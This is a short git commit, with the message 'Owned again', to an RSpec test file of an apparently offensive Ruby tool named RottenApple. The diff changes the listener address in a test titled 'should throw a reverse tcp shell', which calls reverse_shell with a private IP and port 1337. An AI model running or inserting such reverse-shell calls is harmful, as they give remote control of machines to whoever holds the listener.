c0a4134ffb27b701cd2da76edf5a22c7afe49446
Jonathan Claudius <claudijd@yahoo.com>
2013-03-21 11:15:40 -0500

    Owned again

--- spec/rotten_apple_spec.rb
+++ spec/rotten_apple_spec.rb
@@ -11,7 +11,7 @@ describe RottenApple::Attack do
     its(:class) {should == RottenApple::Attack}
     
     it "should throw a reverse tcp shell" do
-      subject.reverse_shell('192.168.238.11', 1337)
+      subject.reverse_shell('10.225.71.7', 1337)
     end
 
     #it "should perform an NMAP scan" do
